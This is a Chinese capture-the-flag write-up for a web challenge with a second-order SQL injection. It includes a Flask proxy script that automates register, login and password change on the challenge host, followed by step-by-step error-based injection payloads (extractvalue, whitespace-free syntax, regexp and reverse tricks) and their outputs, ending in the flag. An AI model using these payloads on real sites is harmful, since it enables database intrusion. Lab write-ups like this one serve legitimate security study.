![[Pasted image 20230102083703.png|500]]

---
首页长这样
![[Pasted image 20230102083746.png]]

注册账户的时候卡了一下，看源码差点没晕掉，哪有`email`过滤`@`的QAQ
![[Pasted image 20230102084658.png|1000]]

使用用户名`admin"`注册，登录并在`changepwd.php`修改密码后，会出现错误提示
![[Pasted image 20230102094151.png|700]]

官方`wp`非常优雅地使用了代理转发来实现过程的自动化，赶紧学起来

```python
import requests
from flask import Flask, request, Response

app = Flask(__name__)
end_host = 'xxx.node4.buuoj.cn:81'
session = requests.Session()

@app.before_request
def before_request():
    data = request.data or request.form or None
    r = hack(data['username'])
    resp_headers = []
    for name, value in r.headers.items():
        if name.lower() in ('content-length', 'connection', 'content-encoding'):
            continue
        resp_headers.append((name, value))
    return Response(r, status=r.status_code, headers=resp_headers)

def hack(username):
    register(username)
    login(username)
    return changepwd()

def register(username):
    paramsPost = {'password': '123', 'email': '11', 'username': username}
    session.post('http://{}/register.php'.format(end_host), data=paramsPost)

def login(username):
    paramsPost = {'password': '123', 'username': username}
    session.post('http://{}/login.php'.format(end_host), data=paramsPost)

def changepwd():
    paramsPost = {'oldpass': '', 'newpass': ''}
    response = session.post('http://{}/changepwd.php'.format(end_host), data=paramsPost)
    return response

app.run(port=80, debug=True)
```

![[Pasted image 20230102095135.png|1000]]

由于存在错误回显，尝试报错注入（空格、`right`、`limit`这些被`ban`了）
```sql
username=admin"^extractvalue(1,concat(0x5c,database()))#
```

```
XPATH syntax error: '\web_sqli'
```

```sql
username=admin"^extractvalue(1,concat(0x5c,(select(group_concat(table_name))from(information_schema.tables)where(table_schema='web_sqli'))))#
```

```
XPATH syntax error: '\article,flag,users'
```

```sql
username=admin"^extractvalue(1,concat(0x5c,(select(group_concat(column_name))from(information_schema.columns)where(table_name='flag'))))#
```

```
XPATH syntax error: '\flag'
```

```sql
username=admin"^extractvalue(1,concat(0x5c,(select(group_concat(flag))from(flag))))#
```

```
XPATH syntax error: '\RCTF{Good job! But flag not her'
```

不在`flag`表里

```sql
username=admin"^extractvalue(1,concat(0x5c,(select(group_concat(column_name))from(information_schema.columns)where(table_name='users'))))#
```

```
XPATH syntax error: '\name,pwd,email,real_flag_1s_her'
```

使用`regexp`获取被截断的项
```sql
username=admin"^extractvalue(1,concat(0x5c,(select(group_concat(column_name))from(information_schema.columns)where(table_name='users')&&(column_name)regexp('^r'))))#
```

```
XPATH syntax error: '\real_flag_1s_here'
```

```sql
username=admin"^extractvalue(1,concat(0x5c,(select(group_concat(real_flag_1s_here))from(users))))#
```

```
XPATH syntax error: '\xxx,xxx,xxx,xxx,xxx,xxx,xxx,xxx'
```

再次使用`regexp`匹配

```sql
username=admin"^extractvalue(1,concat(0x5c,(select(group_concat(real_flag_1s_here))from(users)where(real_flag_1s_here)regexp('^f'))))#
```

```
XPATH syntax error: '\flag{a8f839e3-d22e-4629-a4f9-3a'
```

使用`reverse`获取被截断的内容

```sql
username=admin"^extractvalue(1,concat(0x5c,(select(group_concat(reverse(real_flag_1s_here)))from(users)where(real_flag_1s_here)regexp('^f'))))#
```

```
XPATH syntax error: '\}f44af64b92a3-9f4a-9264-e22d-3e'
```

倒转后拼接即可

#Web #SQL注入 #代理 #报错注入 #绕过 